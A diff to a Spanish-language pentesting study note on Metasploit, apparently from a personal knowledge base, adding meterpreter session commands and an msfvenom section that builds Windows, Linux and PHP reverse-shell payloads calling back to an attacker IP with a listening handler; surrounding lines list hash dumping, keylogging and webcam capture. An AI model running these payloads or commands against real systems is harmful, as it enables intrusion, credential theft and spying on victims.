@@ -59,11 +59,38 @@ hashdump                         # Dump de hashes
 download <file>                  # Descargar archivo
 upload <file>                    # Subir archivo
 shell                            # Shell del sistema
+background (o bg)                # Dejar sesión activa en background
 execute -f cmd.exe -i -H         # Ejecutar processo
 keyscan_start                    # Iniciar keylogger
 keyscan_dump                     # Dump del keylogger
 screenshot                       # Captura de pantalla
 webcam_snap                      # Foto de webcam
+```
+
+## Sesiones
+
+```bash
+sessions                         # Listar sesiones
+sessions -i <id>                 # Interactuar con sesión
+sessions -k <id>                 # Cerrar sesión
+```
+
+## msfvenom — Generación de payloads
+
+```bash
+# Reverse shells
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<TU_IP> LPORT=4444 -f exe -o shell.exe
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=<TU_IP> LPORT=4444 -f elf -o shell.elf
+msfvenom -p php/reverse_php LHOST=<TU_IP> LPORT=4444 -f raw -o shell.php
+
+# Listar payloads
+msfvenom -l payloads
+
+# Escuchar con handler
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST <TU_IP>
+run
 ```
 
 ## Post-explotación
@@ -103,22 +130,23 @@ msfconsole -r script.rc
 
 
 
+
+
 ---
 
 ## 🔗 Red de Conocimiento
 
 ### Documentos Relacionados
 
-- [[Netcat.md|Netcat]] — Escalada de Privilegios, Forense Digital, Netcat / Reverse Shells
-- [[../11 - Forense Digital/Análisis Forense y Memoria.md|Análisis Forense y Memoria]] — Forense Digital, Netcat / Reverse Shells, Wireshark
-- [[../../apuntes evolve/BLOQUE 6.md|BLOQUE 6]] — Escalada de Privilegios, Forense Digital, Netcat / Reverse Shells
-- [[../../apuntes evolve/BLOQUE 7.md|BLOQUE 7]] — Escalada de Privilegios, Forense Digital, Netcat / Reverse Shells
-- [[../02 - Sistemas Operativos/Linux - Comandos Avanzados de Pentesting.md|Linux - Comandos Avanzados de Pentesting]] — Forense Digital, Netcat / Reverse Shells, Wireshark
-- [[../06 - Explotacion y Post-Explotacion/Explotación de Servicios - Windows.md|Explotación de Servicios - Windows]] — Escalada de Privilegios, Metasploit, Netcat / Reverse Shells
+- [[Netcat.md|Netcat]] — Linux, Metodologia Pentest, Netcat / Reverse Shells
+- [[../11 - Forense Digital/Análisis Forense y Memoria.md|Análisis Forense y Memoria]] — Linux, Metodologia Pentest, Netcat / Reverse Shells
+- [[../02 - Sistemas Operativos/Linux - Comandos Avanzados de Pentesting.md|Linux - Comandos Avanzados de Pentesting]] — Linux, Metodologia Pentest, Netcat / Reverse Shells
+- [[../../comandos/Metasploit.md|Metasploit]] — Linux, Metodologia Pentest, Post-Explotacion
+- [[../06 - Explotacion y Post-Explotacion/Escalada de Privilegios.md|Escalada de Privilegios]] — Linux, Metodologia Pentest, Netcat / Reverse Shells
 
-### 🛠️ Herramientas
+### 🌐 Cross-Dominio
 
-- [[comandos/Metasploit|Metasploit]]
-- [[comandos/Metasploit|Netcat / Reverse Shells]]
+- [[../../../programacion/XML/xpath_xslt.md|xpath_xslt]] — Programacion: CLI/Scripting, Linux, Redes
+- [[../../../redes/dig_nslookup.md|dig_nslookup]] — Redes: CLI/Scripting, Linux, Redes
 
-> #escalada-privilegios #forense #linux #metasploit #netcat #pentest #post-explotacion #redes #reverse-shell #windows #wireshark
+> #cli #forense #linux #linux_ciber #metasploit #netcat #pentest #post_explotacion #redes #reverse_shell #wireshark
